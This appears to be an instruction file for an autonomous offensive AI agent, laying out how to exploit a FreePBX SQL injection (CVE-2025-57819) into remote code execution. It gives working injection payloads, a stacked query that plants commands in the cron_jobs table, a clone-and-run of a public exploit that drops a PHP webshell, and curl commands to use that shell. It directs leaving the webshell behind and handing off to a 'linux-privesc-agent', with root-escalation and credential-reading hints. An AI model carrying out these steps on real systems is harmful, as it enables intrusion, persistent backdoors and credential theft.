# Skill: FreePBX unauth SQLi → cron RCE (CVE-2025-57819)

Trigger: FreePBX admin at `/admin` (`config.php`) with `load_version`/`?load_version=`
16.x < 16.0.89 (also check footer / `assets/*.css?load_version=`). Endpoint
Manager present. Apache/PHP appliance, often CentOS + Asterisk.

Procedure:
1. Fingerprint: `curl -sk https://T/admin/config.php` → title "FreePBX
   Administration"; grab `load_version=16.0.40.7`. Confirm `/admin/ajax.php`
   reachable (bare request 403; needs full params).
2. Confirm unauth SQLi (no referrer/auth needed) via the endpoint module ajax
   dispatcher — inject in `brand`:
   `GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x' AND EXTRACTVALUE(1,CONCAT('~',(SELECT USER()),'~')) -- -`
   → SQLSTATE XPATH error leaks the DB user (`freepbxuser@localhost`).
3. Stacked queries are enabled → chain RCE by INSERTing a row into `cron_jobs`;
   FreePBX's `fwconsole job --run` cron executes it as the `asterisk` user
   (~60s):
   `...&brand=x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','x','<cmd>',NULL,'* * * * *',30,1,1) -- -`
4. Easiest: run the watchTowr DAG generator, which base64-writes a PHP webshell
   to `/var/www/html/this-is-an-ioc-not-actually-watchTowr-<rand>.php`, polls it,
   then deletes only the cron rows. Read output for the exact path.
   `git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819 && python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://T`
5. Use shell: `curl -sk --data-urlencode "cmd=id" -G "https://T/<webshell>.php"` → `uid=999(asterisk)`.
   Cleanup: DELETE your `cron_jobs` rows (`jobname LIKE 'watchTowr-%'`) but leave
   the webshell for the privesc agent.
6. Local privesc on these boxes: read `/etc/freepbx.conf` (DB creds), check root
   `incrond` (`/etc/incron.d/*`) → writable `/usr/local/asterisk/*` triggers root
   scripts (e.g. `/usr/sbin/sysadmin_ha` includes the asterisk-writable
   `modules/freepbx_ha/functions.inc/incron.php`). Hand to linux-privesc-agent.

Notes: URL-encode `\` as needed; base64 `+` must be `%2b`. If config.php times
out, suspect MTU/fragmentation on the tunnel (`ip link set tun0 mtu 1200`).
